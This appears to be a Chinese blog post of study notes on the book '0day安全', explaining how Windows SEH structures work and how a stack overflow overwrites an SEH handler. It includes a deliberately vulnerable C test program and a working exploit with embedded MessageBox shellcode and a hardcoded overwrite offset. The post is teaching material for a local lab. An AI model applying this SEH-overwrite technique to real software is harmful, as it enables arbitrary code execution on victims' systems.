---
title: 0day安全软件漏洞学习第三弹
date: 2022-04-04 16:09:03
tags:
    - 漏洞学习
---

<!--more-->

这几天看了《0day安全软件漏洞学习》的456章，第4章和第五章的内容没啥新奇的，我很快的过了一遍，第六章的内存攻击倒是我第一次接触,因为书里讲得太详细了，我也就直接搬运吧，主要记录一下这个过程。

# 在栈溢出中利用S.E.H 

## 介绍

先来了解一下什么是SEH：

​		S.E.H即异常处理结构体（Structure Exception Handler）,它是Windows异常处理机制所采用的重要数据结构。每个S.E.H包含两个DWORD指针：S.E.H链表指针和异常处理函数句柄，共8个字节。结构和指针类似。

![image-20220404161238624](https://s2.loli.net/2022/04/04/JelNGcxusVmbMdR.png)

作为对S.E.H的初步了解，我们现在只需要知道以下几个要点： 

（1）S.E.H结构体存放在系统栈中。 

（2）当线程初始化时，会自动向栈中安装一个S.E.H，作为线程默认的异常处理。 

（3）如果程序源代码中使用了__try{}__except{}或者Assert宏等异常处理机制，编译器将最终通过向当前函数栈帧中安装一个S.E.H来实现异常处理。 

（4）栈中一般会同时存在多个S.E.H。 

（5）栈中的多个S.E.H通过链表指针在栈内由栈顶向栈底串成单向链表，位于链表最顶端的S.E.H通过T.E.B（线程环境块）0字节偏移处的指针标识。 

（6）当异常发生时，操作系统会中断程序，并首先从T.E.B的0字节偏移处取出距离栈顶最近的S.E.H，使用异常处理函数句柄所指向的代码来处理异常。 

（7）当离“事故现场”最近的异常处理函数运行失败时，将顺着S.E.H链表依次尝试其他的异常处理函数。 

（8）如果程序安装的所有异常处理函数都不能处理，系统将采用默认的异常处理函数。通常，这个函数会弹出一个错误对话框，然后强制关闭程序。 

![image-20220404161642885](https://s2.loli.net/2022/04/04/jLnEYStmaA2XfRQ.png)

## 利用方式

（1）S.E.H存放在栈内，故溢出缓冲区的数据有可能淹没S.E.H。

（2）精心制造的溢出数据可以把S.E.H中异常处理函数的入口地址更改为shellcode的起始地址。 （3）溢出后错误的栈帧或堆块数据往往会触发异常。 

（4）当Windows开始处理溢出后的异常时，会错误地把shellcode当作异常处理函数而执行。 

## 实例

### 泄露SEH地址的EXP

```
#include <windows.h> 
char shellcode[] = "\x90\x90\x90\x90……"; 
DWORD MyExceptionhandler(void) { 
	printf("got an exception, press Enter to kill process!\n"); 
	getchar(); 
	ExitProcess(1); 
} 
void test(char * input) 
{ 
	char buf[200]; 
	int zero=0; 
	__asm int 3 //used to break process for debug 
	__try 
	{ 
	strcpy(buf,input); //overrun the stack 
	zero=4/zero; //generate an exception 
	}
	__except(MyExceptionhandler()){}
	
} main() { 
	test(shellcode); 
}
```

对代码简要解释如下。 

（1）函数test中存在典型的栈溢出漏洞。 

（2）__try{}会在test的函数栈帧中安装一个S.E.H结构。

（3）__try中的除零操作会产生一个异常。 

（4）当strcpy操作没有产生溢出时，除零操作的异常将最终被MyExceptionhandler函数处理。 （5）当strcpy操作产生溢出，并精确地将栈帧中的S.E.H异常处理句柄修改为shellcode的入口地址时，操作系统将会错误地使用shellcode去处理除零异常，也就是说，代码植入成功。 

（6）此外，异常处理机制与堆分配机制类似，会检测进程是否处于调试状态。如果直接使用调试器加载程序，异常处理会进入调试状态下的处理流程。因此，我们这里同样采用直接在代码中加入断点_asm int 3，让进程自动中断后再用调试器attach的方法进行调试。 

​	**这个实验的关键在于确定栈帧中S.E.H回调句柄的偏移，然后布置缓冲区，精确地淹没这个位置，将该句柄修改为shellcode的起始位置。**

​		暂时将shellcode赋值为一段不至于产生溢出的0x90，按照实验环境编译运行代码，程序会自动中断，并提示选择终止运行或者进行调试,OllyDbg会自动Attach到进程上并停在断点_asm int 3处。

![image-20220404162404826](https://s2.loli.net/2022/04/04/jBtHXvqWbfeTo9L.png)

​	单击OllyDbg菜单“View”中的“SEH chain”，Ollydbg会显示出目前栈中所有的S.E.H结构的位置和其注册的异常回调函数句柄

![image-20220404162627342](https://s2.loli.net/2022/04/04/MeShyNw5fWlKd8R.png)

OllyDbg当前线程一共安装了3个S.E.H，离栈顶最近的位于0x0012FF68，如果在当前函数内发生异常，首先使用的将是这个S.E.H。我们回到栈中看看这个S.E.H的状况，OllyDbg已经自动为它加上了注释，

![image-20220404162557680](https://s2.loli.net/2022/04/04/o8vAcsdgYbLHntm.png)

​	这个S.E.H就在离EBP与函数返回地址不远的地方，0x0012FF68为指向下一个S.E.H的链表指针，0x0012FF6C处的指针0x00401214则是我们需要修改的异常回调函数句柄。 

​	剩下的工作就是组织缓冲区，把0x0012FF6C处的回调句柄修改成shellcode的起始地址0x0012FE98。

​	缓冲区起始地址0x0012FE98与异常句柄0x0012FF6C之间共有212个字节的间隙，也就是说，超出缓冲区12个字节后的部分将覆盖S.E.H。 

​	仍然使用弹出“failwest”消息框的shellcode进行测试，将不足212字节的部分用0x90字节补齐；213~216字节使用0x0012FE98填充，用于更改异常回调函数的句柄；最后删去代码中的中断指令_asm int 3。 

### 利用SEH漏洞**EXP：**

```
#include <windows.h> char shellcode[]= "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" "\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C" "\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53" "\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B" "\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95" "\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59" "\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A" "\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75" "\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03" "\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB" "\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50" "\x53\xFF\x57\xFC\x53\xFF\x57\xF8\x90\x90\x90\x90\x90\x90\x90\x90" "\x90\x90\x90\x90\x98\xFE\x12\x00"; 
DWORD MyExceptionhandler(void) { 
	printf("got an exception, press Enter to kill process!\n"); getchar(); 		ExitProcess(1);
} 
void test(char * input) 
{ 
	char buf[200]; 
	int zero=0; 
	_try { 
	strcpy(buf,input); //overrun the stack 	
	zero=4/zero; //generate an exception 
	} 
	_except(MyExceptionhandler()){} 
} main() { 
test(shellcode); 
}
```

重新编译，build成release之后运行，

![image-20220404163101330](https://s2.loli.net/2022/04/04/Pd7F5MSeDQpuxfc.png)

成功在栈溢出中利用S.E.H ，这时操作系统将错误地使用shellcode去处理除零异常，从而使植入的代码获得执行。 
